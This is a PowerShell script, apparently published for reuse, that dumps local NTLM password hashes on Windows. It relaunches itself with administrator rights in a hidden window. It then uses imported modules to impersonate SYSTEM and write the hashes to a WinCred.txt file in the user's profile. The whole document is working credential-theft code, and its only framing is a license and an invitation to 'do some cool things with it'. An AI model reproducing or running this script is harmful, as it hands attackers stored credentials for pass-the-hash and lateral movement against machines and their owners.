<#
.SYNOPSIS
    This Script will NonInteractive Extract an NTLM
    Hash for Local Computer.
    This Script will automatically Running with Elevated
    Privileges (Restart if not).
.DESCRIPTION
    This Script will Extract an NTLM Hash
.NOTES
    File name: NIT-Extract-WinCred.ps1
    VERSION: 1.0.0a
    AUTHOR: New Internet Technologies Inc.
    Created:  2023-10-28
    Licensed under the BSD license.
    Please credit me if you find this script useful and do some cool things with it.
.VERSION HISTORY:
    1.0.0 - (2023-10-28) Script created
    1.0.1 - 
#>
param([switch]$Elevated)

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false)  {
    if ($elevated) {
        # tried to elevate, did not work, aborting
    } else {
#        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -Window Normal -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -Window Hidden -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    }
    exit
}

# 'running with full privileges'
# Set Write Credentials File
$CredFile=$env:UserProfile + "\WinCred.txt"
Write-Host $CredFile

# Import an ImpersonateSystem Module
Import-Module ImpersonateSystem

# Import a NTLMX Module
Import-Module NTLMX

# Delete a WinCred File
if( Test-Path $CredFile ) {
    ri $CredFile
}

Invoke-AsSystem { Get-NTLMLocalPasswordHashes | Out-File $CredFile -Encoding utf8 }

